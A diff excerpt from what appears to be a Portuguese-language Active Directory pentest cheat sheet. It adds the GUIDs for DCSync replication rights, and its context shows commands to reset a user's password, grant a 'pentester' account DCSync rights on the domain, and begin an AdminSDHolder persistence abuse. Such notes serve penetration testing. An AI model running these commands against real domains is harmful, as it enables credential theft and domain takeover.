@@ -1664,6 +1664,10 @@ Set-ADAccountPassword -Identity goku -Reset -NewPassword (ConvertTo-SecureString
 ```
 Add-ObjectAcl -TargetIdentity 'DC=TECH,DC=LOCAL' -PrincipalIdentity pentester -Rights DCSync -Verbose
 ```
+DCSync:
+1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
+1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
+89e95b76-444d-4c62-991a-0facbeda640c
 ##### ADMIN SDHOLDER - DEPOIS DE PEGAR UMA CONTA DE ADMIN, ABUSAR DE PERMISSÃO PARA CONFIGURAR PERMISSÃO FULL PARA DOMINIO (DCSYNC)
 ```
  $MyAdmin = (get-aduser pentester).sid
